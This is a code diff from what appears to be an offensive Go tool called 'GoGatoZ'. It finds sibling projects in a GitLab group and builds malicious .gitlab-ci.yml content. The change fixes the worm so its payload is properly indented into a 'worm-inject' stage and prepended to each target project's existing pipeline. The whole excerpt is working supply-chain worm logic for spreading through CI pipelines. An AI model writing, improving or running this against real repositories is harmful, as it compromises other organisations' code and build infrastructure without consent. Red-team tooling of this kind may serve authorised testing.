@@ -329,20 +329,18 @@ func discoverSiblings(ctx context.Context, client *gitlab.Client, groupPath, tar
 	var siblings []int64
 	page := int64(1)
 	for {
-		projOpts := &gitlab.ListProjectsOptions{
-			Search: new(groupPath),
-			Owned:  new(true),
+		opts := &gitlab.ListGroupProjectsOptions{
 			ListOptions: gitlab.ListOptions{
 				PerPage: 100,
 				Page:    page,
 			},
 		}
-		projects, resp, err := client.Projects.ListProjects(projOpts, gitlab.WithContext(ctx))
+		projects, resp, err := client.Groups.ListGroupProjects(groupPath, opts, gitlab.WithContext(ctx))
 		if err != nil {
-			return siblings, fmt.Sprintf("list projects: %v", err)
+			return siblings, fmt.Sprintf("list group projects: %v", err)
 		}
 		for _, p := range projects {
-			if p.PathWithNamespace == targetPath || p.Namespace == nil || p.Namespace.FullPath != groupPath {
+			if p.PathWithNamespace == targetPath {
 				continue
 			}
 			siblings = append(siblings, p.ID)
@@ -359,6 +357,7 @@ func discoverSiblings(ctx context.Context, client *gitlab.Client, groupPath, tar
 }
 
 func buildWormCI(ctx context.Context, client *gitlab.Client, sibID int64, payload string) string {
+	indented := indentScript(payload, "      ")
 	f, _, ferr := client.RepositoryFiles.GetFile(
 		sibID, ".gitlab-ci.yml",
 		&gitlab.GetFileOptions{Ref: new("main")},
@@ -366,17 +365,18 @@ func buildWormCI(ctx context.Context, client *gitlab.Client, sibID int64, payloa
 	)
 	if ferr == nil && f != nil {
 		decoded, _ := base64.StdEncoding.DecodeString(f.Content)
-		return "# Auto-injected by GoGatoZ supply chain worm\n" + payload + "\n" + string(decoded)
+		existing := string(decoded)
+		return fmt.Sprintf("# Auto-injected by GoGatoZ supply chain worm\nstages: [worm]\nworm-inject:\n  stage: worm\n  script:\n    - |\n%s\n  allow_failure: true\n\n%s", indented, existing)
 	}
-	return fmt.Sprintf(`
-stages: [worm]
+	return fmt.Sprintf(`stages: [worm]
 worm-inject:
   stage: worm
   script:
-    - %s
+    - |
+%s
     - echo "[*] Supply chain worm propagation complete"
   allow_failure: true
-`, payload)
+`, indented)
 }
 
 func injectWormPayload(ctx context.Context, atk *wormAttacker, sibID int64, branch, ciYAML, msg string, out io.Writer) error {
